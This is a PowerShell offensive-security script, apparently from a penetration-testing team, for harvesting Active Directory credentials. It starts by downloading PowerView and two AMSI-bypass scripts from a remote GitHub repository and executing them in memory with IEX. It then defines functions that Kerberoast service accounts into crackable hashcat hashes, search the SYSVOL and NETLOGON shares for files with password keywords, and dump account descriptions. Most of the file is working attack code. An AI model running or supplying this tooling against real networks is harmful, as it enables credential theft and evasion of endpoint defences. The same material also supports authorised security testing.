$currentPath = Get-Location
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xXxhagenxXx/offsec/main/PowerView.ps1')
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xXxhagenxXx/offsec/main/amsibypass1.ps1')
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/xXxhagenxXx/offsec/main/amsibypass2.ps1')


<#
.SYNOPSIS
    Function used to gather Kerberoastable Hashes.

.DESCRIPTION
    The function retrieves accounts that have SPNs or service principal names which also known as Kerberoasting attack.

.PARAMETER Domain
    Required parameter to specify the domain name to use for the gathering of information.

.EXAMPLE
   KerberoastHashes -Domain example.com

.NOTES
    Author: Netsync Offsec
    Version: 1.0
#>


function KerberoastHashes{
    param($Domain)
    Invoke-Kerberoast -Domain $Domain -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII -FilePath "$currentPath\hashes.kerberoast"
    if (-not (Test-Path "$currentPath\Kerberoasting")) {
        New-Item -ItemType Directory -Path "$currentPath\Kerberoasting"
    }
    Move-Item "$currentPath\hashes.kerberoast" -Destination "$currentPath\Kerberoasting" -Force
}

<#
.SYNOPSIS
    Function used to gather files that may contain plain text credentials or passwords.

.DESCRIPTION
    The function recursively search on different files and folders under sysvol and netlogon to look for files that may contain plain text credentials or passwords.

.PARAMETER Domain
    Required parameter to specify the domain name to use for the gathering of information.

.EXAMPLE
   CredentialFinder -Domain example.com
   
.EXAMPLE
   CredentialFinder -Domain example.com -fileExtensions xml

.EXAMPLE
   CredentialFinder -Domain example.com -fileExtensions xml -keywords cpasswd
   
.NOTES
    Author: Netsync Offsec
    Version: 1.0
#>

function CredentialFinder{
    param($Domain, $fileExtensions = @("xml", "txt", "ps1", "vbs", "js", "vba", "cmd", "bat"), $keywords = @("pass", "pwd", "cpassword", "creds", "credentials"))
    $shares = @("netlogon","sysvol")
    
    foreach($share in $shares) {
        $path = "\\$Domain\$share\"
        Write-Host "Enumerating: $path"
        foreach ($extension in $fileExtensions) {
            Get-ChildItem -Path $path  -Filter "*.$extension" -Recurse -FollowSymlink | ForEach-Object {
                # Gather full path and file name
                $fullPath = $_.FullName
                $fileName = $_.Name

                # Read file contents
                $fileContent = Get-Content $fullPath

                # Search for each keyword using regular expressions
                foreach ($keyword in $keywords) {
                    if ($fileContent -match $keyword) {
                        "Keyword found in: $fullPath ($fileName) - Keyword: $keyword" | Out-File -FilePath .\CredentialFinder.txt -Append
                    }
                }
            }
        }
    
    }
        if (-not (Test-Path "$currentPath\CredentialFinder")) {
        New-Item -ItemType Directory -Path "$currentPath\CredentialFinder"
    }
    Move-Item "$currentPath\CredentialFinder.txt" -Destination "$currentPath\CredentialFinder" -Force
}


<#
.SYNOPSIS
    Function used to gather user and computer accounts descriptions that may contain plain text credentials or passwords.

.DESCRIPTION
    The function retrieves objects samaccountname and descriptions that may contain plain text credentials or passwords.

.PARAMETER Domain
    Required parameter to specify the domain name to use for the gathering of information.

.EXAMPLE
   PWdOnDescription -Domain example.com
   
.NOTES
    Author: Netsync Offsec
    Version: 1.0
#>

function PWdOnDescription{
    param($Domain)
            if (-not (Test-Path "$currentPath\ObjectDescriptions")) {
        New-Item -ItemType Directory -Path "$currentPath\ObjectDescriptions"
    }
    Get-NetUser -Domain $Domain | Where-Object {$_.useraccountcontrol -notmatch 'ACCOUNTDISABLE'} | Select-Object samaccountname,description |Out-File -FilePath "$currentPath\UsersDescription.txt"
    Get-NetComputer -Domain $Domain | Where-Object {$_.useraccountcontrol -notmatch 'ACCOUNTDISABLE'} | Select-Object samaccountname,description | Out-File -FilePath "$currentPath\ComputersDescription.txt"
    Move-Item "$currentPath\*Description.txt" -Destination "$currentPath\ObjectDescriptions" -Force
}


<#
.SYNOPSIS
    Function that runs all the functions.

.DESCRIPTION
    The function that iterates to run all of the low hanging fruits such as credentials on sysvol, credentials on object descriptions and credentials on network accessible shares.

.PARAMETER Domain
    Required parameter to specify the domain name to use for the gathering of information.

.EXAMPLE
    Invoke-AllCommands -Domain example.com
   
.NOTES
    Author: Netsync Offsec
    Version: 1.0
#>
function Invoke-AllCommands {
    param($Domain)
    KerberoastHashes -Domain $Domain
    CredentialFinder -Domain $Domain
    PWdOnDescription -Domain $Domain
}
